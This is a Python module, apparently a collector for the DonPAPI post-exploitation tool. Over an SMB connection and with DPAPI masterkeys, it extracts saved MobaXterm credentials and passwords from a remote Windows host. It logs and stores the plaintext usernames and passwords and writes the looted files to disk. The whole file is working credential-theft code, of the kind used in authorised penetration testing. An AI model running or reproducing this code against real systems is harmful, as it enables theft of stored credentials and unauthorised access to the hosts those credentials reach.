from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.utils import dump_looted_files_to_disk
from dploot.triage.mobaxterm import MobaXtermTriage, MobaXtermCredential, MobaXtermPassword
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


class MobaXTerm:
    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore, false_positive: list, max_filesize: int) -> None:
        self.tag = self.__class__.__name__
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.false_positive = false_positive
        self.max_filesize = max_filesize

    def run(self):
        if self.context.remoteops_allowed:
            self.logger.display("Dumping MobaXterm credentials")
            def mobaxterm_callback(credential):
                if isinstance(credential, MobaXtermCredential):
                    self.logger.secret(f"[Credential] [{credential.winuser}] {credential.name} - {credential.username}:{credential.password.decode('latin-1')}", self.tag)
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, program=self.tag, username=credential.username, password=credential.password.decode('latin-1'))
                elif isinstance(credential, MobaXtermPassword):
                    self.logger.secret(f"[Password] [{credential.winuser}] {credential.username}:{credential.password.decode('latin-1')}", self.tag) 
                    self.context.db.add_secret(computer=self.context.host, collector=self.tag, windows_user=credential.winuser, program=self.tag, username=credential.username, password=credential.password.decode('latin-1'))
            mobaxterm_triage = MobaXtermTriage(target=self.target, conn=self.conn, masterkeys=self.masterkeys, per_secret_callback=mobaxterm_callback)
            try:
                mobaxterm_triage.triage_mobaxterm()
                dump_looted_files_to_disk(self.context.target_output_dir, mobaxterm_triage.looted_files)
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.logger.error(f"Error while dumping mobaxterm: {e}")